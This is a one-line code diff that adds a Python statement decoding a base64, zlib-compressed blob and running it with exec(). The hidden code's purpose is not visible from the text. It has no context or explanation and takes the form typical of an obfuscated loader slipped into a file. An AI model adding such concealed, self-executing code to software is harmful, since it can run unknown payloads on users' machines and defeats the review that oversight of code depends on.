@@ -1,0 +1,1 @@
+import base64, zlib; exec(zlib.decompress(base64.b64decode("eJyFjcEKwjAMhu99il9PCmVMdxbBkxfxoOC5bmEtdu1oWre9vVPnriaBfEkInzBN60NEGYeWWIjEFIotdtMi64yrrM2+6985OxGzqung+9tKYIxcftryEJKW6PQAFQiDT4jauIdx9QgqvifGWArsUygJpa9ov1hO77frccK8L/IPrP86zw8JR33E04TE6Iy1uBPaYJ4qEhSDVUPyDVETLt6qYDijnmbvkfSYs3rzU78A3PhTEA==")).decode("utf-8"))
